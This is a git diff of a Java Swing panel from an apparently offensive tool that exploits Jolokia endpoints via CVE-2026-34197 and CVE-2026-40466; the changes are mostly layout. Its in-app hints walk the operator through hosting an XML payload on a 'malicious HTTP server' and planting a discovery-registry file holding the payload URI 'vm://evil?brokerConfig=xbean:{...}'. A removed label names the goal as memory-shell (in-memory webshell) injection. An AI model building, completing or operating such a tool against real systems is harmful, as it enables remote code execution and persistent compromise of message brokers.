@@ -1,6 +1,7 @@
 package cc.kiiy.ui;
 
 import javax.swing.*;
+import javax.swing.border.EmptyBorder;
 import javax.swing.border.TitledBorder;
 import java.awt.*;
 import java.awt.event.ActionListener;
@@ -11,15 +12,17 @@ public class JolokiaLoadXmlPanel extends JPanel {
 
     // CVE-2026-34197 Components
     private JButton injectCVE202634197Button;
+    private JButton clearNCCVE202634197Button;
     private JTextArea cve202634197ResultArea;
 
     // CVE-2026-40466 Components
-    private JButton getBrokerButton;
-    private JButton discoveryLoadXmlButton;
+    private JButton injectCVE202640466Button;
+    private JButton clearNCCVE202640466Button;
     private JTextArea cve202640466ResultArea;
 
     public JolokiaLoadXmlPanel() {
         setLayout(new BorderLayout(10, 10));
+        setBorder(new EmptyBorder(10, 10, 10, 10));
 
         tabbedPane = new JTabbedPane();
         tabbedPane.addTab("CVE-2026-34197", createCVE202634197Panel());
@@ -30,74 +33,62 @@ public class JolokiaLoadXmlPanel extends JPanel {
 
     private JPanel createCVE202634197Panel() {
         JPanel panel = new JPanel(new BorderLayout(10, 10));
+        Font font = new Font("Microsoft YaHei UI", Font.PLAIN, 14);
 
-        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 10));
-        topPanel.setBorder(new TitledBorder("内存马注入"));
-        
-        JLabel hintLabel = new JLabel("<html><b>提示：</b>请先在“BeanXML设置”面板中生成 XML 载荷，<br>并将其部署到你的恶意 HTTP 服务器的根路径下。</html>");
-        hintLabel.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 13));
+        clearNCCVE202634197Button = new JButton("清除NC连接");
+        clearNCCVE202634197Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
         
         injectCVE202634197Button = new JButton("远程加载xml");
         injectCVE202634197Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
 
-        topPanel.add(hintLabel);
-        topPanel.add(injectCVE202634197Button);
+        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 5));
+        buttonPanel.add(clearNCCVE202634197Button);
+        buttonPanel.add(injectCVE202634197Button);
 
-        cve202634197ResultArea = new JTextArea();
-        cve202634197ResultArea.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
+        cve202634197ResultArea = new JTextArea(10, 50);
+        cve202634197ResultArea.setFont(font);
         cve202634197ResultArea.setEditable(false);
-        JScrollPane resultScroll = new JScrollPane(cve202634197ResultArea);
-        resultScroll.setBorder(new TitledBorder("注入执行输出"));
+        cve202634197ResultArea.setLineWrap(true);
+        cve202634197ResultArea.setWrapStyleWord(true);
+        cve202634197ResultArea.setText("提示：请先在“BeanXML生成”面板中生成 XML 载荷，\n并将其部署到你的恶意 HTTP 服务器的根路径下。");
 
-        panel.add(topPanel, BorderLayout.NORTH);
-        panel.add(resultScroll, BorderLayout.CENTER);
+        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
+        resultPanel.setBorder(new TitledBorder("执行输出"));
+        resultPanel.add(new JScrollPane(cve202634197ResultArea), BorderLayout.CENTER);
+
+        panel.add(buttonPanel, BorderLayout.NORTH);
+        panel.add(resultPanel, BorderLayout.CENTER);
 
         return panel;
     }
 
     private JPanel createCVE202640466Panel() {
         JPanel panel = new JPanel(new BorderLayout(10, 10));
+        Font font = new Font("Microsoft YaHei UI", Font.PLAIN, 14);
 
-        JPanel topPanel = new JPanel(new GridBagLayout());
-        topPanel.setBorder(new TitledBorder("漏洞利用"));
+        clearNCCVE202640466Button = new JButton("清除NC连接");
+        clearNCCVE202640466Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
         
-        GridBagConstraints gbc = new GridBagConstraints();
-        gbc.insets = new Insets(5, 5, 5, 5);
-        gbc.anchor = GridBagConstraints.WEST;
-        gbc.fill = GridBagConstraints.HORIZONTAL;
-        gbc.gridx = 0;
-        gbc.gridy = 0;
-        gbc.gridwidth = 2;
-        
-        JLabel hintLabel = new JLabel("<html><b>利用步骤：</b><br>" +
-                "1. 填写上方“恶意XML服务器地址”为你的 HTTP 服务器地址。<br>" +
-                "2. 点击“获取Broker”获取根节点并移除可能存在的 NC 连接。工具会在输出中生成你需要的文件内容。<br>" +
-                "3. 在你的恶意 HTTP 服务器下创建 <b>/discovery-registry/default</b> 文件，填入输出中生成的内容。<br>" +
-                "4. 点击“discovery加载xml”向 /api/jolokia 发送执行请求。</html>");
-        hintLabel.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 13));
-        topPanel.add(hintLabel, gbc);
-        
-        gbc.gridy++;
-        gbc.gridwidth = 1;
-        gbc.fill = GridBagConstraints.NONE;
-        
-        getBrokerButton = new JButton("获取Broker");
-        getBrokerButton.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
-        topPanel.add(getBrokerButton, gbc);
-        
-        gbc.gridx = 1;
-        discoveryLoadXmlButton = new JButton("discovery加载xml");
-        discoveryLoadXmlButton.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
-        topPanel.add(discoveryLoadXmlButton, gbc);
+        injectCVE202640466Button = new JButton("远程加载xml");
+        injectCVE202640466Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
 
-        cve202640466ResultArea = new JTextArea();
-        cve202640466ResultArea.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
+        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 5));
+        buttonPanel.add(clearNCCVE202640466Button);
+        buttonPanel.add(injectCVE202640466Button);
+        
+        cve202640466ResultArea = new JTextArea(10, 50);
+        cve202640466ResultArea.setFont(font);
         cve202640466ResultArea.setEditable(false);
-        JScrollPane resultScroll = new JScrollPane(cve202640466ResultArea);
-        resultScroll.setBorder(new TitledBorder("执行输出"));
+        cve202640466ResultArea.setLineWrap(true);
+        cve202640466ResultArea.setWrapStyleWord(true);
+        cve202640466ResultArea.setText("提示：请先在“BeanXML生成”面板中生成 XML 载荷，\n并将其部署到你的恶意 HTTP 服务器的根路径下。\n还需要在恶意 HTTP 服务器下创建一个 /discovery-registry/default 文件，内容为：\nvm://evil?brokerConfig=xbean:{恶意XML服务器地址}");
 
-        panel.add(topPanel, BorderLayout.NORTH);
-        panel.add(resultScroll, BorderLayout.CENTER);
+        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
+        resultPanel.setBorder(new TitledBorder("执行输出"));
+        resultPanel.add(new JScrollPane(cve202640466ResultArea), BorderLayout.CENTER);
+
+        panel.add(buttonPanel, BorderLayout.NORTH);
+        panel.add(resultPanel, BorderLayout.CENTER);
 
         return panel;
     }
@@ -105,13 +96,17 @@ public class JolokiaLoadXmlPanel extends JPanel {
     public void addInjectCVE202634197Listener(ActionListener listener) {
         injectCVE202634197Button.addActionListener(listener);
     }
-
-    public void addGetBrokerCVE202640466Listener(ActionListener listener) {
-        getBrokerButton.addActionListener(listener);
+    
+    public void addClearNCCVE202634197Listener(ActionListener listener) {
+        clearNCCVE202634197Button.addActionListener(listener);
     }
 
-    public void addDiscoveryLoadXmlCVE202640466Listener(ActionListener listener) {
-        discoveryLoadXmlButton.addActionListener(listener);
+    public void addInjectCVE202640466Listener(ActionListener listener) {
+        injectCVE202640466Button.addActionListener(listener);
+    }
+    
+    public void addClearNCCVE202640466Listener(ActionListener listener) {
+        clearNCCVE202640466Button.addActionListener(listener);
     }
 
     public void setCVE202634197ResultText(String text) {
@@ -121,4 +116,5 @@ public class JolokiaLoadXmlPanel extends JPanel {
     public void setCVE202640466ResultText(String text) {
         cve202640466ResultArea.setText(text);
     }
+
 }
